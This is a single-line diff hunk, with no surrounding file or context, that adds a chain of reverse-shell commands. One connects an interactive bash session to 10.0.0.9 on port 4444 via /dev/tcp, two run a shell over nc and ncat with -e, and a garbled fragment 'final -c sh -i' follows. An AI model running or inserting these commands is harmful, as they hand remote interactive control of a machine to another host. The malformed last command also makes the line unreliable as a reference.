@@ -1,0 +1,1 @@
+bash -i >& /dev/tcp/10.0.0.9/4444; nc -e /bin/sh; ncat -e /bin/bash; final -c sh -i
